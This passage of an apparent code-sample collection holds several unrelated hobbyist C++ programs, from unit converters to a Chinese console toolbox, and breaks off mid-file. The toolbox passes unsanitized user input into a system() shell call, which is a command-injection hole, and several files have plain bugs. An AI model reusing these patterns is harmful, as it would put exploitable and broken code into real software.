    "#include \"scaleswap.h\"\n#include \"menu_output.cpp\"\n#include \"conversion.cpp\"\n\nusing namespace std;\n\nint main() {\n    string unit_origin, unit_destiny;\n    double value;\n    int index;\n    int finalindex;\n\n    while (true) {\n        welcomer();\n        cin >> index;\n\n        if (cin.fail() || index < 1 || index > 3) {\n            errorMessager();\n            continue;\n        }\n\n        if (index == 1) {\n            mt_selected();\n            display_units(metric_system);\n            unit_origin = getValidU(metric_system);\n            asker();\n            cin >> index;\n\n            if (cin.fail() || index < 1 || index > 2) {\n                errorMessager();\n                continue;\n            }\n\n            if (index == 1) {\n                display_units(metric_system);\n                unit_destiny = getValidU(metric_system);\n            } else if (index == 2) {\n                display_units(imperial_system);\n                unit_destiny = getValidU(imperial_system);\n            }\n        } else if (index == 2) {\n            in_selected();\n            display_units(imperial_system);\n            unit_origin = getValidU(imperial_system);\n            asker();\n            cin >> index;\n\n            if (cin.fail() || index < 1 || index > 2) {\n                errorMessager();\n                continue;\n            }\n\n            if (index == 1) {\n                display_units(metric_system);\n                unit_destiny = getValidU(metric_system);\n            } else if (index == 2) {\n                display_units(imperial_system);\n                unit_destiny = getValidU(imperial_system);\n            }\n        } else if (index == 3) {\n            cout << \"Exiting the program.\" << endl;\n            break;\n        }\n\n        value = getValidV();\n\n        double value_con = calculate(value, unit_origin, unit_destiny);\n\n        if (value_con != -1) {\n            cout << value << \" \" << unit_origin << \" is equal to \" << value_con << \" \" << unit_destiny << \".\" << endl;\n        }\n    }\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <nlohmann/json.hpp>\r\n#include \"Buffer.hpp\"\r\n#include \"Component.hpp\"\r\n#include \"Printer.hpp\"\r\n\r\nusing json = nlohmann::json;\r\nusing namespace std;\r\n\r\nshared_ptr<Component> jsonToTree(const json& j, const string& key) {\r\n    if (j.is_object()) {\r\n        auto composite = make_shared<CompositeNode>(key);\r\n        for (auto it = j.begin(); it != j.end(); ++it) {\r\n            composite->addChild(jsonToTree(it.value(), it.key()));\r\n        }\r\n        return composite;\r\n    } else if (j.is_array()) {\r\n        auto composite = make_shared<CompositeNode>(key);\r\n        for (size_t i = 0; i < j.size(); ++i) {\r\n            composite->addChild(jsonToTree(j[i], \"[\" + to_string(i) + \"]\"));\r\n        }\r\n        return composite;\r\n    } else {\r\n        return make_shared<TreeNode>(key, j.dump());\r\n    }\r\n}\r\n\r\nint main() {\r\n    // \u6253\u5f00JSON\u6587\u4ef6\r\n    ifstream inputFile(\"example.json\");\r\n    if (!inputFile.is_open()) {\r\n        cerr << \"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6!\" << endl;\r\n        return 1;\r\n    }\r\n\r\n    // \u89e3\u6790JSON\u6587\u4ef6\r\n    json j;\r\n    inputFile >> j;\r\n\r\n    // \u5c06JSON\u8f6c\u6362\u4e3a\u591a\u53c9\u6811\r\n    shared_ptr<Component> root = jsonToTree(j);\r\n\r\n    // \u521b\u5efaPrinter\u5bf9\u8c61\r\n    shared_ptr<Printer> printer = make_shared<RectangleSpacePrinter>();\r\n\r\n    // \u521b\u5efaBuffer\u5bf9\u8c61\r\n    shared_ptr<Buffer> buffer = make_shared<RectangleBuffer>(printer);\r\n\r\n    // \u5c06\u591a\u53c9\u6811\u5185\u5bb9\u8f6c\u6362\u4e3a\u98ce\u683c\u5e76\u653e\u5165\u7f13\u51b2\u533a\r\n    buffer->printTree(root);\r\n\r\n    // \u6253\u5370\u7f13\u51b2\u533a\u5185\u5bb9\r\n    buffer->printBuffer();\r\n    std::cout << std::endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"barperspective.h\"\n\nBarPerspective::BarPerspective(QWidget *parent)\n    : QWidget(parent), angle(0), direction(true)\n{\n    setFixedSize(800, 600);\n\n    vertices = {\n        QVector3D(-1.5, -0.5, -0.5),\n        QVector3D( 1.5, -0.5, -0.5),\n        QVector3D( 1.5,  0.5, -0.5),\n        QVector3D(-1.5,  0.5, -0.5),\n        QVector3D(-1.5, -0.5,  0.5),\n        QVector3D( 1.5, -0.5,  0.5),\n        QVector3D( 1.5,  0.5,  0.5),\n        QVector3D(-1.5,  0.5,  0.5)\n    };\n\n    timer = new QTimer(this);\n    connect(timer, &QTimer::timeout, this, &BarPerspective::updateAnimation);\n    timer->start(7);\n\n    elapsedTimer.start();\n}\n\nvoid BarPerspective::paintEvent(QPaintEvent *)\n{\n    QPainter painter(this);\n    painter.setRenderHint(QPainter::Antialiasing);\n\n    painter.translate(width() / 2, height() / 2);\n\n    drawBar(painter);\n}\n\nvoid BarPerspective::updateAnimation()\n{\n    qint64 elapsed = elapsedTimer.elapsed();\n    elapsedTimer.restart();\n\n    double deltaAngle = 180.0 * (elapsed / 1000.0) * (1.0 / 5.0);\n\n    if (direction) {\n        angle += deltaAngle;\n        if (angle >= 180.0) {\n            angle = 180.0;\n            direction = false;\n        }\n    } else {\n        angle -= deltaAngle;\n        if (angle <= -180.0) {\n            angle = -180.0;\n            direction = true;\n        }\n    }\n\n    update();\n}\n\nvoid BarPerspective::drawBar(QPainter &painter)\n{\n    QVector<QPointF> projectedVertices;\n    projectedVertices.reserve(vertices.size());\n    for (int i = 0; i < vertices.size(); ++i) {\n        QVector3D rotatedVertex = rotatePoint(vertices[i], angle, QVector3D(0, 1, 0));\n        projectedVertices.append(projectPoint(rotatedVertex));\n    }\n\n    const int edges[12][2] = {\n        {0, 1}, {1, 2}, {2, 3}, {3, 0},\n        {4, 5}, {5, 6}, {6, 7}, {7, 4},\n        {0, 4}, {1, 5}, {2, 6}, {3, 7}\n    };\n\n    for (int i = 0; i < 12; ++i) {\n        if (edges[i][0] == 1 && edges[i][1] == 2) {\n            QPen redPen(Qt::red);\n            painter.setPen(redPen);\n        } else {\n            QPen blackPen(Qt::black);\n            painter.setPen(blackPen);\n        }\n        painter.drawLine(projectedVertices[edges[i][0]], projectedVertices[edges[i][1]]);\n    }\n}\n\nQPointF BarPerspective::projectPoint(const QVector3D &point)\n{\n    double d = 2.0; // \u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0434\u043e \u043f\u0440\u043e\u0435\u043a\u0446\u0438\u043e\u043d\u043d\u043e\u0439 \u043f\u043b\u043e\u0441\u043a\u043e\u0441\u0442\u0438\n\n    double x = point.x() / (1 - point.z() / d);\n    double y = point.y() / (1 - point.z() / d);\n\n    return QPointF(x * 100, y * 100);\n}\n\nQVector3D BarPerspective::rotatePoint(const QVector3D &point, double angle, const QVector3D &axis)\n{\n    double radian = angle * M_PI / 180.0;\n    double cosA = cos(radian);\n    double sinA = sin(radian);\n    QVector3D rotated;\n\n    if (axis == QVector3D(1, 0, 0)) { // \u0432\u0440\u0430\u0449\u0435\u043d\u0438\u0435 \u0432\u043e\u043a\u0440\u0443\u0433 \u043e\u0441\u0438 X\n        rotated.setX(point.x());\n        rotated.setY(point.y() * cosA - point.z() * sinA);\n        rotated.setZ(point.y() * sinA + point.z() * cosA);\n    } else if (axis == QVector3D(0, 1, 0)) { // \u0432\u0440\u0430\u0449\u0435\u043d\u0438\u0435 \u0432\u043e\u043a\u0440\u0443\u0433 \u043e\u0441\u0438 Y\n        rotated.setX(point.x() * cosA + point.z() * sinA);\n        rotated.setY(point.y());\n        rotated.setZ(-point.x() * sinA + point.z() * cosA);\n    } else if (axis == QVector3D(0, 0, 1)) { // \u0432\u0440\u0430\u0449\u0435\u043d\u0438\u0435 \u0432\u043e\u043a\u0440\u0443\u0433 \u043e\u0441\u0438 Z\n        rotated.setX(point.x() * cosA - point.y() * sinA);\n        rotated.setY(point.x() * sinA + point.y() * cosA);\n        rotated.setZ(point.z());\n    }\n\n    return rotated;\n}\n",
    "#include <iostream>\r\n#include <stack>\r\n#include <queue>\r\nusing namespace std;\r\n\r\nclass Node\r\n{\r\n    int data;\r\n    Node *left, *right;\r\npublic:\r\n    Node()\r\n    {\r\n        data = 0;\r\n        left = right = NULL;\r\n    }\r\n    Node(int x)\r\n    {\r\n        data = x;\r\n        left = right = NULL;\r\n    }\r\n    friend class Tree;\r\n};\r\n\r\nclass Tree\r\n{\r\n    Node *root;\r\npublic:\r\n    Tree()\r\n    {\r\n        root = NULL;\r\n    }\r\n    Node* getroot()\r\n    {\r\n        return root;\r\n    }\r\n    void create()\r\n    {\r\n        root = insert();\r\n    }\r\n    Node* insert()\r\n    {\r\n        Node *temp = new Node();\r\n        int ch;\r\n        cout << \"Enter the data: \";\r\n        cin >> temp->data;\r\n        cout << \"Do you want to insert data in left of \" << temp->data << \"(0/1): \";\r\n        cin >> ch;\r\n        if (ch)\r\n        {\r\n            temp->left = insert();\r\n        }\r\n        cout << \"Do you want to insert data in right of \" << temp->data << \" (0/1): \";\r\n        cin >> ch;\r\n        if (ch)\r\n        {\r\n            temp->right = insert();\r\n        }\r\n        return temp;\r\n    }\r\n    void postorder(Node *T)\r\n    {\r\n        if (T == NULL)\r\n        {\r\n            return;\r\n        }\r\n        postorder(T->left);\r\n        postorder(T->right);\r\n        cout << T->data << \" \";\r\n    }\r\n    void inordernr()\r\n    {\r\n        Node *T = root;\r\n        stack<Node*> s;\r\n        while (T != NULL)\r\n        {\r\n            s.push(T);\r\n            T = T->left;\r\n        }\r\n        while (!s.empty())\r\n        {\r\n            T = s.top();\r\n            s.pop();\r\n            cout << T->data << \" \";\r\n            T = T->right;\r\n            while (T != NULL)\r\n            {\r\n                s.push(T);\r\n                T = T->left;\r\n            }\r\n        }\r\n    }\r\n    void preodernr()\r\n    {\r\n        Node *T = root;\r\n        stack<Node*> s;\r\n        while (T != NULL)\r\n        {\r\n            cout << T->data << \" \";\r\n            s.push(T);\r\n            T = T->left;\r\n        }\r\n        while (!s.empty())\r\n        {\r\n            T = s.top();\r\n            s.pop();\r\n            T = T->right;\r\n            while (T != NULL)\r\n            {\r\n                cout << T->data << \" \";\r\n                s.push(T);\r\n                T = T->left;\r\n            }\r\n        }\r\n    }\r\n    int height(Node *T)\r\n    {\r\n        if (T == NULL)\r\n        {\r\n            return -1;\r\n        }\r\n        return max(height(T->left), height(T->right)) + 1;\r\n    }\r\n    void mirrorimage(Node *T)\r\n    {\r\n        if (T == NULL)\r\n        {\r\n            return;\r\n        }\r\n        mirrorimage(T->left);\r\n        mirrorimage(T->right);\r\n        Node *temp = T->left;\r\n        T->left = T->right;\r\n        T->right = temp;\r\n    }\r\n    void levelwise(Node *T)\r\n    {\r\n        if (T == NULL)\r\n        {\r\n            return;\r\n        }\r\n        queue<Node*> q;\r\n        q.push(T);\r\n\r\n        while (!q.empty())\r\n        {\r\n            Node *current = q.front();\r\n            q.pop();\r\n            cout << current->data << \" \";\r\n\r\n            if (current->left)\r\n            {\r\n                q.push(current->left);\r\n            }\r\n            if (current->right)\r\n            {\r\n                q.push(current->right);\r\n            }\r\n        }\r\n    }\r\n    Node* insertNode(Node *T, int x)\r\n    {\r\n        if (T == NULL)\r\n        {\r\n            T = new Node(x);\r\n            return T;\r\n        }\r\n        if (x < T->data)\r\n        {\r\n            T->left = insertNode(T->left, x);\r\n        }\r\n        else if (x > T->data)\r\n        {\r\n            T->right = insertNode(T->right, x);\r\n        }\r\n        else\r\n        {\r\n            cout << \"Duplicate entry...\" << endl;\r\n        }\r\n        return T;\r\n    }\r\n    int findMax(Node *T)\r\n    {\r\n        while (T->right != NULL)\r\n        {\r\n            T = T->right;\r\n        }\r\n        return T->data;\r\n    }\r\n    int findMin(Node *T)\r\n    {\r\n        while (T->left != NULL)\r\n        {\r\n            T = T->left;\r\n        }\r\n        return T->data;\r\n    }\r\n    bool search(Node *T, int x)\r\n    {\r\n        while (T != NULL)\r\n        {\r\n            if (x < T->data)\r\n            {\r\n                T = T->left;\r\n            }\r\n            else if (x > T->data)\r\n            {\r\n                T = T->right;\r\n            }\r\n            else\r\n            {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n    void displayMenu()\r\n    {\r\n        int choice, value;\r\n        do\r\n        {\r\n            cout << \"\\n---- Menu ---- \\n\";\r\n            cout << \"1. Insert a new node\\n\";\r\n            cout << \"2. Find numbers of nodes in longest path\\n\";\r\n            cout << \"3. Minimum and maximum data value found in tree\\n\";\r\n            cout << \"4. Swap Tree\\n\";\r\n            cout << \"5. Search an element\\n\";\r\n            cout << \"0. Exit\\n\";\r\n            cout << \"Enter your choice: \";\r\n            cin >> choice;\r\n\r\n            switch (choice)\r\n            {\r\n                case 1:\r\n                    cout << \"Enter value to insert: \";\r\n                    cin >> value;\r\n    ",
    "//===--- EmptyCheck.cpp - clang-tidy --------------------------------------===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n\n#include \"EmptyCheck.h\"\n#include \"clang/ASTMatchers/ASTMatchFinder.h\"\n\nusing namespace clang::ast_matchers;\n\nnamespace clang::tidy::autocrypt {\n\nvoid EmptyCheck::registerMatchers(MatchFinder *Finder) {\n    Finder->addMatcher(\n            cxxMemberCallExpr(\n                on(hasType(cxxRecordDecl(hasName(\"AaslkdjfAasdlkfjzoxcib\")))),\n                callee(functionDecl(\n                    decl().bind(\"nowhere_decl\"),\n                    hasName(\"fooAaslkdjfAasdlkfjzoxcibfoo\"),\n                    hasParameter(0, hasType(isInteger()))))),\n            this);\n}\n\nvoid EmptyCheck::check(const MatchFinder::MatchResult &Result) {\n  // Do nothing\n}\n\n} // namespace clang::tidy::autocrypt\n",
    "#include <iostream>\r\n#include <cmath>\r\n#include <limits>\r\n\r\nusing namespace std;\r\n\r\nclass Shape {\r\nprotected:\r\n    double width;\r\n    double height;\r\n\r\npublic:\r\n    Shape(double w, double h) : width(w), height(h) {}\r\n\r\n    virtual double area() const = 0;\r\n    virtual double perimeter() const = 0;\r\n\r\n    virtual void display() const {\r\n        cout << \"Shape: \";\r\n    }\r\n\r\n    virtual ~Shape() = default;\r\n};\r\n\r\nclass Rectangle : public Shape {\r\npublic:\r\n    Rectangle(double w, double h) : Shape(w, h) {}\r\n\r\n    double area() const override {\r\n        return width * height;\r\n    }\r\n\r\n    double perimeter() const override {\r\n        return 2 * (width + height);\r\n    }\r\n\r\n    void display() const override {\r\n        cout << \"Shape: Rectangle\" << endl;\r\n    }\r\n};\r\n\r\nclass Triangle : public Shape {\r\npublic:\r\n    Triangle(double base, double height) : Shape(base, height) {}\r\n\r\n    double area() const override {\r\n        return 0.5 * width * height;\r\n    }\r\n\r\n    double perimeter() const override {\r\n        // Assuming an equilateral triangle for simplicity\r\n        return 3 * width;\r\n    }\r\n\r\n    void display() const override {\r\n        cout << \"Shape: Triangle\" << endl;\r\n    }\r\n};\r\n\r\nclass Circle : public Shape {\r\npublic:\r\n    Circle(double radius) : Shape(radius, 0) {}\r\n\r\n    double area() const override {\r\n        return M_PI * width * width;\r\n    }\r\n\r\n    double perimeter() const override {\r\n        return 2 * M_PI * width;\r\n    }\r\n\r\n    void display() const override {\r\n        cout << \"Shape: Circle\" << endl;\r\n    }\r\n};\r\n\r\nclass Square : public Shape {\r\npublic:\r\n    Square(double side) : Shape(side, side) {}\r\n\r\n    double area() const override {\r\n        return width * width;\r\n    }\r\n\r\n    double perimeter() const override {\r\n        return 4 * width;\r\n    }\r\n\r\n    void display() const override {\r\n        cout << \"Shape: Square\" << endl;\r\n    }\r\n};\r\n\r\nvoid displayMenu() {\r\n    cout << \"\\nShape Calculation Program\\n\";\r\n    cout << \"1. Rectangle\\n\";\r\n    cout << \"2. Triangle\\n\";\r\n    cout << \"3. Circle\\n\";\r\n    cout << \"4. Square\\n\";\r\n    cout << \"5. Exit\\n\";\r\n    cout << \"Enter your choice: \";\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    double width, height, radius, side;\r\n\r\n    while (true) {\r\n        displayMenu();\r\n        cin >> choice;\r\n\r\n        if (cin.fail()) {\r\n            cin.clear(); // clear the error flag\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n'); // discard invalid input\r\n            cout << \"Invalid input. Please enter a number between 1 and 5.\\n\";\r\n            continue;\r\n        }\r\n\r\n        switch (choice) {\r\n            case 1: {\r\n                cout << \"Enter width of the rectangle: \";\r\n                cin >> width;\r\n                cout << \"Enter height of the rectangle: \";\r\n                cin >> height;\r\n                Rectangle rect(width, height);\r\n                rect.display();\r\n                cout << \"Area: \" << rect.area() << endl;\r\n                cout << \"Perimeter: \" << rect.perimeter() << endl;\r\n                break;\r\n            }\r\n            case 2: {\r\n                cout << \"Enter base of the triangle: \";\r\n                cin >> width;\r\n                cout << \"Enter height of the triangle: \";\r\n                cin >> height;\r\n                Triangle tri(width, height);\r\n                tri.display();\r\n                cout << \"Area: \" << tri.area() << endl;\r\n                cout << \"Perimeter: \" << tri.perimeter() << endl;\r\n                break;\r\n            }\r\n            case 3: {\r\n                cout << \"Enter radius of the circle: \";\r\n                cin >> radius;\r\n                Circle circ(radius);\r\n                circ.display();\r\n                cout << \"Area: \" << circ.area() << endl;\r\n                cout << \"Perimeter: \" << circ.perimeter() << endl;\r\n                break;\r\n            }\r\n            case 4: {\r\n                cout << \"Enter side length of the square: \";\r\n                cin >> side;\r\n                Square sq(side);\r\n                sq.display();\r\n                cout << \"Area: \" << sq.area() << endl;\r\n                cout << \"Perimeter: \" << sq.perimeter() << endl;\r\n                break;\r\n            }\r\n            case 5:\r\n                cout << \"Exiting the program.\\n\";\r\n                return 0;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\\n\";\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "//this is a wonderful windows 19.2.2\r\n#include<bits/stdc++.h>\r\n#include<windows.h>\r\n#include<fstream>\r\nusing namespace std; \r\n//\u547d\u4ee4\u5e93\uff1a\u6e05\u5c4f\uff1asystem(\"cls\"); \r\n//\u7b49\u5f85\uff1aSleep(); \r\n//\u58f0\u97f3\uff1aBeep(\u9891\u7387,\u65f6\u95f4); \r\nstring s;\r\nstring o;\r\nstring c; \r\nint abc;\r\n\r\nvoid Prints(string s,int speed)//\u81ea\u52a8\u6362\u884c \r\n{\r\n\tfor(int i=0; i<s.size(); i++)\r\n\t{\r\n\t\tcout<<s[i];\r\n\t\tSleep(speed);\r\n\t}\r\n\tcout<<endl;\r\n\treturn ;\r\n}\r\nvoid wechat(){\r\n\tputs(\"\u52a0\u6211\u5fae\u4fe1\uff01\uff01\uff01\");\r\n\tputs(\"wx\u53f7\uff1abgp20130427.\u9a8c\u8bc1\u4fe1\u606f\u8bf7\u6572\uff1aLUOGU,UID=XXX(XXX\u4e3a\u6d1b\u8c37uid\u53f7)\");\r\n\tputs(\"\u989d\u989d\u989d\uff0c\u6211\u662f\u4e2axxs\u6b38\uff01\");\r\n\treturn ;\r\n}\r\nvoid gameku(){\r\n\tstring ggg = \"\u6b22\u8fce\u6765\u52304399\u5c0f\u6e38\u620f\u5b98\u7f51\";\r\n\tPrints(ggg, 300);\r\n\tsystem(\"pause\");\r\n\tsystem(\"start https://www.4399.com\");\r\n\treturn ;\r\n}\r\nvoid leetcode(){\r\n\tstring wreerq = \"\u8bf7\u6ce8\u610f\uff0c\u672c\u6b21\u7684\u7f16\u7a0b\u4e4b\u65c5\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u591c\u95f4\u76d7\u6c57\uff0c\u4f7f\u7528\u4e4b\u524d\u52a1\u5fc5\u54a8\u8be2\u76f8\u5173\u533b\u751f\u4f7f\u7528\uff01\uff01\uff01\";\r\n\tputs(\"\u529b\u6263\u7f51\u7ad9-----\u5168\u4e16\u754c\u4eba(\u7cbe\u795e\u75c5\u60a3\u8005)\u7684\u9009\u62e9\");\r\n\tPrints(wreerq, 300);\r\n\tputs(\"\u786e\u5b9a\uff1f(Y/N)\");\r\n\tchar c;\r\n\tcin >> c;\r\n\tif(c == 'Y'){\r\n\t\tputs(\"\u4f60\u786e\u5b9a\u7684\u8bdd\uff0c\u6211\u5c31\u4e0d\u7ba1\u4f60\u4e86\");\r\n\t\tSleep(1000);\r\n\t\tsystem(\"start https://leetcode.cn/\") ;\r\n\t} \r\n\telse{\r\n\t\treturn ;\r\n\t}\r\n\treturn ;\r\n}\r\n\r\nvoid coutrlor(){\r\n\tputs(\"\u8ba1\u7b97\u673a\uff0c\u7528\u4f5c\u4e24\u6570\u7684\u8fd0\u7b97\uff0c\u5148\u8f93\u5165\u7b26\u53f7\uff0c\u540e\u8f93\u5165\u4e24\u4e2a\u6570\");\r\n\tint xv, zxcv;\r\n\tchar yyy;\r\n\tcin >> yyy;\r\n\tcin >> xv >> zxcv;\r\n\tif(yyy = '+'){\r\n\t\tcout << xv + zxcv << endl;\r\n\t} \r\n\telse if(yyy = '-'){\r\n\t\tcout << xv - zxcv << endl;\r\n\t}\r\n\telse if(yyy = '*'){\r\n\t\tcout << xv * zxcv << endl;\r\n\t}\r\n\telse if(yyy = '/'){\r\n\t\tcout << xv / zxcv << endl;\r\n\t}\r\n\telse{\r\n\t\tputs(\"\u65e0\u6548\u7b26\u53f7\");\r\n\t\treturn ;\r\n\t}\r\n} \r\nvoid CPS(){\r\n\tputs(\"\u6d4b\u8bd5\u4f60\u7684\u6e38\u620f\u901f\u5ea6---------\u70b9\u51fb\u66f4\u591a\uff0c\u6e38\u620f\u5c31\u5f00\u6302\uff01\uff01\uff01\");\r\n\tSleep(1000);\r\n\tsystem(\"start https://clickpersecond.com/cn/1-second/\");\r\n\treturn ;\r\n} \r\nvoid mail(){\r\n\tputs(\"\u4f60\u81ea\u5df1\u7684\u672a\u6765\u4fe1\u7bb1\");\r\n\tstring name, things, fut;\r\n\tint ededed;\r\n\tcout << \"\u8f93\u5165\u4f60\u7684\u540d\u5b57\uff1a\";\r\n\tcin >> name;\r\n\tcout << \"\u8f93\u5165\u4f60\u672a\u6765\u60f3\u505a\u7684\u804c\u4e1a\uff1a\";\r\n\tcin >> things; \r\n\tcout << \"\u8f93\u5165\u4f60\u7684\u613f\u671b\";\r\n\tcin >> fut;\r\n\tputs(\"\u5df2\u53d1\u9001\uff01\") ;\r\n\tputs(\"\u662f\u5426\u67e5\u770b\u4fe1\u4ef6(1/0)\");\r\n\tcin >> ededed;\r\n\tif(ededed == 0){\r\n\t\treturn ;\r\n\t} \r\n\telse{\r\n\t\tcout << name << \":\" << endl;\r\n\t\tcout << \"\u4f60\u597d\uff0c\u672a\u6765\u7684\" << name << \"\uff0c\u6211\u5e0c\u671b\u4f60\u6210\u4e3a\u4e00\u540d\" << things << \"\uff0c\u6211\u60f3\u4f60\" << fut << \"\uff0c\u5e0c\u671b\u4f60\u80fd\u5b8c\u6210\uff01\uff01\";  \r\n\t\tputs(\"\");\r\n\t\tcout << \"                                                                                             \" << name;\r\n\t\tcout << endl;\r\n\t}\r\n\treturn ;\r\n} \r\nvoid bd(){\r\n\tputs(\"\u767e\u5ea6\u4e00\u4e0b\");\r\n\tSleep(1000);\r\n\tsystem(\"start https://www.baidu.com/\");\r\n\treturn ;\r\n} \r\nvoid text(){\r\n\tputs(\"\u5237\u9898\u65f6\u95f4\u5230\u4e86\uff0c\u5237\u9898\u5427\uff01\");\r\n\tSleep(1000);\r\n\tint abc = rand()%(10120-1000)+1000;\r\n\tputs(\"\u8bf7\u8f93\u5165\u9898\u53f7\uff01\"); \r\n\tstring qwe;\r\n\tcin >> qwe;\r\n\tstring qwqw = \"start https://www.luogu.com.cn/problem/\" + qwe;\r\n\tsystem(qwqw.c_str());\r\n//\tputs(\"\u5927\u66f4\u6539\u7684\u6d4f\u89c8\u5668\");\r\n//\tSleep(3000);\r\n//\tstring s;\r\n//\tputs(\"\u8f93\u5165\u6d4f\u89c8\u7f51\u9875\u7f51\u5740:\");\r\n//\tcin >> s;\r\n//\ts = \"start \" + s;\r\n//\tsystem(s.c_str());\r\n//\u53c2\u7167\u4ed6\u7684 wushaochen yi Edogawa_Conan\r\n\treturn ;\r\n}\r\nstatic string nowtm(){\r\n\ttime_t t = time(NULL);\r\n\tchar ch[64] = {0};\r\n\tstrftime(ch,sizeof(ch) - 1,\"%Y-%m-%d %H:%M:%S\",localtime(&t));\r\n\treturn ch;\r\n}\r\nvoid presenter(){\r\n\tputs(\"\u670b\u53cb\u4eec\u5927\u5bb6\u597d\uff0c\u73b0\u5728\u7684\u65f6\u95f4\u662f\uff1a\");\r\n\tcout << nowtm() << endl;\r\n\tcout << endl;\r\n\tputs(\"\u4e16\u754c\u90a3\u4e48\u5927\uff0c\u6211\u60f3\u53bb\u770b\u770b\");\r\n\tputs(\"\u6765\u6765\u6765\"); \r\n\tsystem(\"start https://www.luogu.com.cn/team/71582\");\r\n\treturn ;\r\n}\r\nvoid ziyanfa(){\r\n\tputs(\"\u60a8\u5df2\u8fdb\u5165\u81ea\u7814\u53d1\u89e3\u6790\");\r\n\tputs(\"\u540d\uff1aTbS-FXS-endsts\");\r\n\tint sxsxdsx;\r\n\tputs(\"\u8bf7\u8f93\u5165\u6570\u5b57\");\r\n\tputs(\"\u5217\u8868\uff1a\");\r\n\tputs(\"0.\u9000\u51fa 1.\u949f\u8868 2.\u56e2\u961f 3.\u7b80\u4ecb 4.Administrator\");\r\n\twhile(1){\r\n\t\tcin >> sxsxdsx;\r\n\t\tif(sxsxdsx == 0){\r\n\t\t\treturn ;\r\n\t\t}\r\n\t\tif(sxsxdsx == 1){\r\n\t\t\tcout << \"\u65f6\u95f4\" << nowtm() << endl; \r\n\t\t}\r\n\t\tif(sxsxdsx == 2){\r\n\t\t\tputs(\"\u6211\u4eec\u7684\u7814\u53d1\u56e2\u961f: TBS-FXS\u56e2\u961f\");\r\n\t\t\tputs(\"\u8be6\u60c5\u89c1QQ\u7fa4908658106\");\r\n\t\t\tPrints(\"\u82e5\u60f3\u9000\u51fa\uff0c\u8bf7\u5728\u8fd9\u6bb5\u6587\u5b57\u7ed3\u675f\u540e\u6309 [0] \u9000\u51fa\", 100);\r\n\t\t}\r\n\t\tif(sxsxdsx == 3){\r\n\t\t\tputs(\"\u7cfb\u7edf\u5df2\u5b9e\u73b0\u81ea\u7814\u53d1\uff01\uff01\uff01\");\r\n\t\t\tputs(\"\u8fd9\u662f\u4e00\u4e2a\u7cfb\u7edf\");\r\n\t\t\tputs(\"\u7cfb\u7edf\u9ad8\u6548\u53c8\u597d\u7b11\");\r\n\t\t\tPrints(\"\u82e5\u60f3\u9000\u51fa\uff0c\u8bf7\u5728\u8fd9\u6bb5\u6587\u5b57\u7ed3\u675f\u540e\u6309 [0] \u9000\u51fa\", 100);\r\n\t\t}\r\n\t\tif(sxsxdsx == 4){\r\n\t\t\tputs(\"Administrator\");\r\n\t\t\tputs(\"\u6307\u4ee4\uff1a\");\r\n\t\t\tputs(\"\u6309 [mkd] + \u6587\u4ef6\u5939\u540d\u5b57(\u53ea\u8f93\u5165\u4e00\u4e2a\u5b57\u6bcd) \u521b\u5efa\u6587\u4ef6\u5939 \u6309 [odd] + \u6587\u4ef6\u5939\u540d\u5b57 \u6253\u5f00\u6587\u4ef6\u5939(\u53ea\u8f93\u5165\u4e00\u4e2a\u5b57\u6bcd) \u6309[mkt] + \u6587\u4ef6\u540d\u5b57\u521b\u5efa\u6587\u4ef6(\u53ea\u8f93\u5165\u4e00\u4e2a\u5b57\u6bcd) \u6309 [o] \u9000\u51fa (\u6307\u4ee4\u9700\u8981\u6309\u56de\u8f66\uff0c\u9000\u51fa\u4e0d\u7528)\");\r\n\t\t\twhile(1){\r\n\t\t\t\tstring one;\r\n\t\t\t\tchar two; \r\n\t\t\t\tchar mkeddir[10001];\r\n\t\t\t\tcin >> one;\r\n\t\t\t\tif(one == \"o\"){\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tint y = 1;\r\n\t\t\t\tif(one == \"mkd\"){\r\n\t\t\t\t\tcin >> two;\r\n\t\t\t\t\tcout << \"\u60a8\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a\" << two << \"\u7684\u6587\u4ef6\u5939\" << endl;\r\n\t\t\t\t\ty = 1;\r\n\t\t\t\t\tmkeddir[y] = two;\r\n\t\t\t\t\ty ++;\r\n\t\t\t\t}\r\n\t\t\t\tif(one == \"odd\"){\r\n\t\t\t\t\tputs(\"\u8bf7\u8f93\u5165\u60a8\u7b2c\u51e0\u4e2a\u521b\u5efa-1\u7684\u6587\u4ef6\u5939\");\r\n\t\t\t\t\tcin >> y;\r\n\t\t\t\t\tcout << \"\u8fd9\u662f\u4e00\u4e2a\u540d\u4e3a\" << mkeddir[y] << \"\u7684\u6587\u4ef6\u5939\" << endl; \r\n\t\t\t\t\tcout << \"\u60a8\u6253\u5f00\u4e86\" << endl;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tif(one == \"mkt\"){\r\n\t\t\t\t\tcin >> two;\r\n\t\t\t\t\tcout << \"\u60a8\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a\" << two << \"\u7684TXT\u6587\u4ef6\" << endl;\r\n\t\t\t\t\tcout << \"\u8f93\u5165\u5185\u5bb9\uff0c\u6309 [Q + \u56de\u8f66] \u5b8c\u6210\";\r\n\t\t\t\t\tstring saving;\r\n\t\t\t\t\tfor(int i = 0; i < 100001; i++){\r\n\t\t\t\t\t\tcin >> saving[i];\r\n\t\t\t\t\t\tif(saving[i] == 'Q'){\r\n\t\t\t\t\t\t\tPrints(\"\u5b8c\u6210\u5b8c\u6210\uff01\", 50);\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\tcout << 